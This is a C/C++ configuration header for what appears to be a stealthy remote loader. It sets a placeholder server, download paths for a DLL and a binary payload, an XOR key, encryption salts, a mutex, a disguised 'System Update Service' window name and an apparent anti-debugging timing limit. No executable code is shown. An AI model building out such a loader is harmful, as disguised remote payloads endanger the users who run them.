#pragma once

#define CFG_HOST            L"your.server.com"
#define CFG_LOADER_PATH     L"/loader/loader.dll"
#define CFG_DLL_PATH        L"/swift.bin"
#define CFG_AUTH_PATH       L"/auth"
#define CFG_PORT            443

#define CFG_XOR_KEY         0x9F2A4B8C1D6E3F70ULL

#define CFG_KEY_SALT        "loader_key_v1_"
#define CFG_IV_SALT         "loader_iv__v1_"

#define CFG_MUTEX_NAME      L"Local\\{A3F8C2D1-4E7B-49A0-B5C3-D2E1F6A8B9C0}"

#define CFG_WINDOW_TITLE    L"System Update Service"
#define CFG_WINDOW_CLASS    L"SystemSvc"

#define CFG_TIMING_LIMIT    3'000'000ULL

#define CFG_EXPECTED_HASH { \
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  \
}
